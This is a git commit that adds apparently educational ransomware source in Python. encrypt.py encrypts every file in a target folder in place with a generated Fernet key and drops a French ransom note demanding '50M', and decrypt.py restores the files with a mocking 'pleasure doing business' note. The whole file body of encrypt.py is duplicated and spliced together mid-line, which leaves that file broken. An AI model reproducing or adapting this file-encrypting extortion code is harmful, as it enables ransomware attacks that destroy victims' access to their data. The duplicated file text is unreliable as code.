1f84ade25690754f19238019af96ad51e775b7c4
Daïto <45793246+daitohck@users.noreply.github.com>
2022-08-04 19:41:57 +0200

    Add files via upload

---
+++ decrypt.py
@@ -0,0 +1,25 @@
+from cryptography.fernet import Fernet
+import os
+
+def decrypt(fullpath):
+  with open('key.key', 'r') as file:
+    key=file.read()
+    f=Fernet(key)
+    with open(fullpath, 'rb') as f2:
+      content=f.decrypt(f2.read())
+    print(content)
+    with open(fullpath, 'wb') as f2:
+      f2.write(content)
+
+if __name__ == '__main__':
+    path_to_encrypt = '/home/kali/Desktop/ransomware/slides'
+
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt + '/' + item for item in items if item!='readme.txt']
+    print(full_path)
+    for i in full_path:
+      decrypt(i)
+
+with open(path_to_encrypt + '/readmev2.txt', 'w') as file:
+    file.write('Data déchiffré \n')
+    file.write('un plaisir de faire affaire avec vous')
---
+++ encrypt.py
@@ -0,0 +1,75 @@
+from cryptography.fernet import Fernet
+import os
+
+
+def generate_key():
+
+    key = Fernet.generate_key()
+    with open('key.key', 'wb') as key_file:
+        key_file.write(key)
+    return key
+
+
+def key():
+    return open('key.key', 'rb').read()
+
+def encrypt(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open(item, 'wb') as file:
+            file.write(encrypted_data)
+
+
+if __name__ == '__main__':
+
+    path_to_encrypt = '/home/kali/Desktop/ransomware/slides'
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt + '/' + item for item in items]
+
+    key = generate_key()
+
+    encrypt(full_path, key)
+
+    with open(path_to_encrypt + '/readme.txt', 'w') as file:
+        file.write('prend un aspirine tu vas en avoir besoin \n')
+        file.write('paye 50M    ')from cryptography.fernet import Fernet
+import os
+
+
+def generate_key():
+
+    key = Fernet.generate_key()
+    with open('key.key', 'wb') as key_file:
+        key_file.write(key)
+    return key
+
+
+def key():
+    return open('key.key', 'rb').read()
+
+def encrypt(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open(item, 'wb') as file:
+            file.write(encrypted_data)
+
+
+if __name__ == '__main__':
+
+    path_to_encrypt = '/home/kali/Desktop/ransomware/slides'
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt + '/' + item for item in items]
+
+    key = generate_key()
+
+    encrypt(full_path, key)
+
+    with open(path_to_encrypt + '/readme.txt', 'w') as file:
+        file.write('prend un aspirine tu vas en avoir besoin \n')
+        file.write('paye 50M    ')
